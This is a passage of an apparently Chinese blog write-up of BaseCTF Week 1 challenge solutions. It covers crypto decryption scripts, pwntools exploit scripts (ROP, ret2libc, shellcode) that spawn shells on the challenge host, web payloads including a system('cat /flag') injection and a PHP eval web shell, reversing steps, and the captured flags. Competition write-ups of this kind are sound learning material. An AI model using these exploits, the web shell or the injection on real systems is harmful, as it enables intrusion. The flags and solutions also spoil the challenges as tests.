= decrypt(cipher)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag:&quot;</span>, decrypted_flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>BaseCTF{yoUr_CrYpt0_1earNinG_5tarTs_n0w}</p><h4 id="Week1-helloCrypto"><a href="#Week1-helloCrypto" class="headerlink" title="[Week1] helloCrypto"></a>[Week1] helloCrypto</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"></span><br><span class="line">key = long_to_bytes(<span class="number">208797759953288399620324890930572736628</span>)</span><br><span class="line">my_aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">ciphertext = <span class="string">b&#x27;U\xcd\xf3\xb1 r\xa1\x8e\x88\x92Sf\x8a`Sk],\xa3(i\xcd\x11\xd0D\x1edd\x16[&amp;\x92@^\xfc\xa9(\xee\xfd\xfb\x07\x7f:\x9b\x88\xfe&#123;\xae&#x27;</span></span><br><span class="line">plaintext = unpad(my_aes.decrypt(ciphertext), AES.block_size)</span><br><span class="line"><span class="built_in">print</span>(plaintext)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="Week1-你会算md5吗"><a href="#Week1-你会算md5吗" class="headerlink" title="[Week1] 你会算md5吗"></a>[Week1] 你会算md5吗</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">output = [<span class="string">&#x27;9d5ed678fe57bcca610140957afab571&#x27;</span>, <span class="string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>, <span class="string">&#x27;03c7c0ace395d80182db07ae2c30f034&#x27;</span>, <span class="string">&#x27;e1671797c52e15f763380b45e841ec32&#x27;</span>, <span class="string">&#x27;0d61f8370cad1d412f80b84d143e1257&#x27;</span>, <span class="string">&#x27;b9ece18c950afbfa6b0fdbfa4ff731d3&#x27;</span>, <span class="string">&#x27;800618943025315f869e4e1f09471012&#x27;</span>, <span class="string">&#x27;f95b70fdc3088560732a5ac135644506&#x27;</span>, <span class="string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>, <span class="string">&#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;</span>, <span class="string">&#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;</span>, <span class="string">&#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;</span>, <span class="string">&#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;</span>, <span class="string">&#x27;eccbc87e4b5ce2fe28308fd9f2a7baf3&#x27;</span>, <span class="string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>, <span class="string">&#x27;e4da3b7fbbce2345d7772b0674a318d5&#x27;</span>, <span class="string">&#x27;336d5ebc5436534e61d16e63ddfca327&#x27;</span>, <span class="string">&#x27;eccbc87e4b5ce2fe28308fd9f2a7baf3&#x27;</span>, <span class="string">&#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;</span>, <span class="string">&#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;</span>, <span class="string">&#x27;45c48cce2e2d7fbdea1afc51c7c6ad26&#x27;</span>, <span class="string">&#x27;336d5ebc5436534e61d16e63ddfca327&#x27;</span>, <span class="string">&#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;</span>, <span class="string">&#x27;8f14e45fceea167a5a36dedd4bea2543&#x27;</span>, <span class="string">&#x27;1679091c5a880faf6fb5e6087eb1b2dc&#x27;</span>, <span class="string">&#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;</span>, <span class="string">&#x27;336d5ebc5436534e61d16e63ddfca327&#x27;</span>, <span class="string">&#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;</span>, <span class="string">&#x27;8277e0910d750195b448797616e091ad&#x27;</span>, <span class="string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>, <span class="string">&#x27;c81e728d9d4c2f636f067f89cc14862c&#x27;</span>, <span class="string">&#x27;336d5ebc5436534e61d16e63ddfca327&#x27;</span>, <span class="string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>, <span class="string">&#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;</span>, <span class="string">&#x27;c9f0f895fb98ab9159f51fd0297e236d&#x27;</span>, <span class="string">&#x27;e1671797c52e15f763380b45e841ec32&#x27;</span>, <span class="string">&#x27;e1671797c52e15f763380b45e841ec32&#x27;</span>, <span class="string">&#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;</span>, <span class="string">&#x27;8277e0910d750195b448797616e091ad&#x27;</span>, <span class="string">&#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;</span>, <span class="string">&#x27;45c48cce2e2d7fbdea1afc51c7c6ad26&#x27;</span>, <span class="string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>, <span class="string">&#x27;c9f0f895fb98ab9159f51fd0297e236d&#x27;</span>, <span class="string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>, <span class="string">&#x27;cbb184dd8e05c9709e5dcaedaa0495cf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> md5 <span class="keyword">in</span> output:</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        <span class="keyword">if</span> hashlib.md5(<span class="built_in">bytes</span>([char])).hexdigest() == md5:</span><br><span class="line">            flag += <span class="built_in">chr</span>(char)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>BaseCTF{a4bf43a5-3ff9-4764-bda2-af8ee4db9a8a}</p><h4 id="Week1-ez-rsa"><a href="#Week1-ez-rsa" class="headerlink" title="[Week1] ez_rsa"></a>[Week1] ez_rsa</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> symbols, Eq, solve</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, inverse</span><br><span class="line"></span><br><span class="line">n = <span class="number">96557532552764825748472768984579682122986562613246880628804186193992067825769559200526147636851266716823209928173635593695093547063827866240583007222790344897976690691139671461342896437428086142262969360560293350630096355947291129943172939923835317907954465556018515239228081131167407674558849860647237317421</span></span><br><span class="line"><span class="comment">#not_phi=(p+2)*(q+2)</span></span><br><span class="line">not_phi = <span class="number">96557532552764825748472768984579682122986562613246880628804186193992067825769559200526147636851266716823209928173635593695093547063827866240583007222790384900615665394180812810697286554008262030049280213663390855887077502992804805794388166197820395507600028816810471093163466639673142482751115353389655533205</span></span><br><span class="line">c = <span class="number">37077223015399348092851894372646658604740267343644217689655405286963638119001805842457783136228509659145024536105346167019011411567936952592106648947994192469223516127472421779354488529147931251709280386948262922098480060585438392212246591935850115718989480740299246709231437138646467532794139869741318202945</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p_plus_q = (not_phi - n - <span class="number">4</span>) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">x = symbols(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">eq1 = Eq(x ** <span class="number">2</span> - p_plus_q * x + n, <span class="number">0</span>)</span><br><span class="line">solutions = solve(eq1)</span><br><span class="line"></span><br><span class="line">p = <span class="built_in">int</span>(solutions[<span class="number">0</span>])</span><br><span class="line">q = <span class="built_in">int</span>(solutions[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> p * q == n</span><br><span class="line"></span><br><span class="line">phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">d = inverse(e, phi_n)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"></span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>BaseCTF{it_1s_ez!!}</p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h4 id="Week1-我把她丢了"><a href="#Week1-我把她丢了" class="headerlink" title="[Week1] 我把她丢了"></a>[Week1] 我把她丢了</h4><p>rop链需要ret作为滑板</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;challenge.basectf.fun&quot;</span>, <span class="number">24280</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000401196</span></span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line">str_bin_sh = <span class="number">0x402008</span></span><br><span class="line">system = <span class="number">0x0401080</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * (<span class="number">0x70</span> + <span class="number">0x8</span>) + p64(ret) + p64(pop_rdi) + p64(str_bin_sh) + p64(system)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;I lost her, what should I do? Help me find her.&quot;</span>, payload)</span><br><span class="line">p.sendline(<span class="string">b&quot;cat$&#123;IFS&#125;flag&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="Week1-Ret2text"><a href="#Week1-Ret2text" class="headerlink" title="[Week1] Ret2text"></a>[Week1] Ret2text</h4><p>ret2text</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;challenge.basectf.fun&quot;</span>,<span class="number">43152</span>)</span><br><span class="line">backdoor = <span class="number">0x04011A4</span></span><br><span class="line">payload = (<span class="number">0x20</span>+<span class="number">0x8</span>)*<span class="string">b&#x27;\x00&#x27;</span> + p64(<span class="number">0x000000000040101a</span>) + p64(backdoor)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">b&quot;cat$&#123;IFS&#125;flag&quot;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>BaseCTF{2d50a54d-9c7d-4d12-bcd9-14aed02eee80}</p><h4 id="Week1-shellcode-level0"><a href="#Week1-shellcode-level0" class="headerlink" title="[Week1] shellcode_level0"></a>[Week1] shellcode_level0</h4><p>ret2shellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;challenge.basectf.fun&quot;</span>, <span class="number">43626</span>)</span><br><span class="line"></span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line">p.recvuntil(<span class="string">b&quot;please input shellcode: &quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">b&quot;cat$&#123;IFS&#125;flag&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>BaseCTF{74724bbd-f76d-4a52-aa8f-3b71e5227a7a}</p><h4 id="Week1-签个到吧"><a href="#Week1-签个到吧" class="headerlink" title="[Week1] 签个到吧"></a>[Week1] 签个到吧</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat flag</span><br></pre></td></tr></table></figure><p>BaseCTF{84334f64-0731-4425-b804-532af4b78fca}</p><h4 id="Week1-echo"><a href="#Week1-echo" class="headerlink" title="[Week1] echo"></a>[Week1] echo</h4><p>重定向输入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;challenge.basectf.fun&quot;</span>,<span class="number">31340</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;while read line; do echo $line; done &lt; flag&quot;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>BaseCTF{cece856a-c546-456b-a9a0-37df58bbb666}</p><h4 id="Week1-彻底失去她"><a href="#Week1-彻底失去她" class="headerlink" title="[Week1] 彻底失去她"></a>[Week1] 彻底失去她</h4><p>ret2libc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;彻底失去她&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;challenge.basectf.fun&quot;</span>,<span class="number">46254</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment"># p = process(&#x27;彻底失去她&#x27;)</span></span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">start = <span class="number">0x00000000004010B0</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000401196</span></span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;By the way, I still don&#x27;t know your name, could you tell me your name?&quot;</span>)</span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * (<span class="number">0xA</span> + <span class="number">0X8</span>) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(start)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&#x27;addr: &#x27;</span>+<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#9 - libc6_2.35-0ubuntu3.8_amd64</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line"></span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">system = libc_base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;By the way, I still don&#x27;t know your name, could you tell me your name?&quot;</span>)</span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * (<span class="number">0xA</span> + <span class="number">0X8</span>) + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">b&quot;cat$&#123;IFS&#125;flag&quot;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h4 id="Week1-HTTP-是什么呀"><a href="#Week1-HTTP-是什么呀" class="headerlink" title="[Week1] HTTP 是什么呀"></a>[Week1] HTTP 是什么呀</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?basectf=we1c%2500me</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>challenge.basectf.fun:27260</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Base</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>Base</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>11</span><br><span class="line"><span class="attribute">X-Forwarded-For</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>c00k13=i can&#x27;t eat it</span><br><span class="line"></span><br><span class="line"><span class="language-abnf"><span class="attribute">Base</span><span class="operator">=</span>fl%<span class="number">40</span>g</span></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">302</span> Found</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.18.0</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Thu, 15 Aug 2024 01:29:14 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>PHP/7.4.27</span><br><span class="line"><span class="attribute">Location</span><span class="punctuation">: </span>success.php?flag=QmFzZUNURntmMzhiNmZlYi03Y2Y1LTQ4OGItYmFhMC00MjM4ZTY1NTFmOWN9Cg==</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>BaseCTF{f38b6feb-7cf5-488b-baa0-4238e6551f9c}</p><h4 id="Week1-喵喵喵´•ﻌ•"><a href="#Week1-喵喵喵´•ﻌ•" class="headerlink" title="[Week1] 喵喵喵´•ﻌ•&#96;"></a>[Week1] 喵喵喵´•ﻌ•&#96;</h4><p><a href="http://challenge.basectf.fun:43684/?DT=system(%22cat%20/flag%22)">http://challenge.basectf.fun:43684/?DT=system(%22cat%20/flag%22)</a>;</p><p>BaseCTF{59a33491-f8df-4d7c-9049-97250c8f6a71}</p><h4 id="Week1-md5绕过欸"><a href="#Week1-md5绕过欸" class="headerlink" title="[Week1] md5绕过欸"></a>[Week1] md5绕过欸</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?name[]=3&amp;name2[]=4</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>challenge.basectf.fun:47385</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>34</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://challenge.basectf.fun:47385</span><br><span class="line"><span class="attribute">DNT</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Sec-GPC</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://challenge.basectf.fun:47385/name[]=3&amp;name2[]=4</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Priority</span><span class="punctuation">: </span>u=0, i</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">password</span>[]=<span class="number">1</span>&amp;password2[]=<span class="number">2</span></span></span><br></pre></td></tr></table></figure><h4 id="Week1-A-Dark-Room"><a href="#Week1-A-Dark-Room" class="headerlink" title="[Week1] A Dark Room"></a>[Week1] A Dark Room</h4><p>注释</p><p> FLAG: BaseCTF{29831c5f-fb52-402e-ae13-bbd246dbc796} </p><h4 id="Week1-upload"><a href="#Week1-upload" class="headerlink" title="[Week1] upload"></a>[Week1] upload</h4><p>蚁剑连上后得到flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>BaseCTF{4d611585-3df3-4f96-b470-f3f210d19a20}</p><h4 id="Week1-Aura-酱的礼物"><a href="#Week1-Aura-酱的礼物" class="headerlink" title="[Week1] Aura 酱的礼物"></a>[Week1] Aura 酱的礼物</h4><p>首先通过伪协议绕过，然后通过<code>.</code>截断<code>strpos</code>比较，使其判定为真，然后将<code>jasmineaura.github.io.</code>作为三层子域名在自己的网站服务器上搭建网页显示<code>已经收到Kengwang的礼物啦</code></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>challenge.basectf.fun:42619</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>164</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>SESS_COOKIE_KUBEPI=cef4a230-396d-4d15-a1c1-1504056be7c7</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">pen</span>=data%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>Ftext%<span class="number">2</span>Fplain%<span class="number">2</span>CAura&amp;challenge=http%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>Fjasmineaura.github.io.主域名.域名后缀&amp;gift=php%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>Ffilter%<span class="number">2</span>Fconvert.base64-encode%<span class="number">2</span>Fresource%<span class="number">3</span>Dflag.php</span></span><br></pre></td></tr></table></figure><p>Base64解码得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgLy8gQmFzZUNURntkM2EzMWUyNC0yYmE4LTRjMDUtYTRhMi01ZmE1YzM5NTNjMGJ9ICBBdXJhIOmFseacieaLv+WIsOS4gOihgOWQl++8nwo=</span><br></pre></td></tr></table></figure><p>BaseCTF{d3a31e24-2ba8-4c05-a4a2-5fa5c3953c0b}</p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h4 id="Week1-You-are-good-at-IDA"><a href="#Week1-You-are-good-at-IDA" class="headerlink" title="[Week1] You are good at IDA"></a>[Week1] You are good at IDA</h4><p>shift+F12找到三段flag拼凑得到最终flag</p><p>BaseCTF{Y0u_4Re_900d_47_id4}</p><h4 id="Week1-UPX-mini"><a href="#Week1-UPX-mini" class="headerlink" title="[Week1] UPX mini"></a>[Week1] UPX mini</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Downloads\upx-4.0.1-win64\upx-4.0.1-win64&gt;upx -d UPXmini.exe</span><br><span class="line">                       Ultimate Packer for eXecutables</span><br><span class="line">                          Copyright (C) 1996 - 2022</span><br><span class="line">UPX 4.0.1       Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Nov 16th 2022</span><br><span class="line"></span><br><span class="line">        File size         Ratio      Format      Name</span><br><span class="line">   --------------------   ------   -----------   -----------</span><br><span class="line">     60222 &lt;-     43326   71.94%    win64/pe     UPXmini.exe</span><br><span class="line"></span><br><span class="line">Unpacked 1 file.</span><br></pre></td></tr></table></figure><p>得到字符串<code>QmFzZUNURntIYXYzX0BfZzBvZF90MW0zISEhfQ==</code>，Base64解密后得到flag</p><p>BaseCTF{Hav3_@_g0od_t1m3!!!}</p><h4 id="Week1-Ez-Xor"><a href="#Week1-Ez-Xor" class="headerlink" title="[Week1] Ez Xor"></a>[Week1] Ez Xor</h4><p>打断点动态调试得到内存中的v14和Str，逆向encrypt()函数逻辑得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 